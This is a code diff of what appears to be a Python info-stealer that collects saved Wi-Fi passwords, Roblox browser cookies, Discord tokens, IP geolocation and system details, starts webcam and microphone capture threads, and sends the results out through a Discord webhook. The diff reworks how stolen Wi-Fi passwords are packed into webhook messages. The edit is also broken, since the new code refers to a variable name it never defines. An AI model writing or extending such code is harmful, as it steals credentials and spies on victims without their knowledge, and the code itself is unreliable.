@@ -101,10 +101,7 @@ def wifipass():
             wifi_info[i] = ""
 
     return wifi_info 
-wifi=str(wifipass())
-wifi=wifi.replace('{','')
-wifi=wifi.replace('}','')
-wifi=wifi.replace(',','\n')
+wifi=wifipass()
 
 
 r = requests.get('http://ipinfo.io/json')
@@ -871,7 +868,6 @@ webcamthread=threading.Thread(target=webcam)
 
 micthread=threading.Thread(target=record_audio)
 
-wifiembed=DiscordEmbed(title='Saved Wifi',description=f'```{wifi}```',color='60cc88')
 geolocationembed=DiscordEmbed(title='IP and Geolocation Data',description=f'```IPv4: {ip4}```\n```IPv6: {ip6()}```\n```Latitude: {lat}```\n```Longitude: {long}```\n```City: {city}```\n```Region: {region}```\n```Country: {country}```\n```Postal Code: {postal}```\n```Timezone: {timezone}```\n```Router Orginisation: {org}```\n```Router Hostname: {hostname}```',color='fcba03')
 robloxembed=DiscordEmbed(title='Roblox Cookies',description=f'Opera:```{robloopera}```\nChrome:```{roblochrome}```\nEdge:```{robloedge}```\nFirefox:```{roblofire}```',color='6f00ff')
 sysembed=DiscordEmbed(title='System Information',description=f'### System Info:',color='ab222b')
@@ -908,6 +904,12 @@ for token in Discordtokens():
 for key, value in sysinfodata.items():
     value = f'```{value}```'
     sysembed.add_embed_field(name=key, value=value)
+
+if wifi:
+    wifi_embed = DiscordEmbed(title='WiFi Passwords',description='### Wifi SSID and passwords', color=65280)  # Green color
+    for ssid, password in wifi.items():
+        password = f'```{password}```'
+        wifiembed.add_embed_field(name=ssid, value=password)
 
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifiembed)
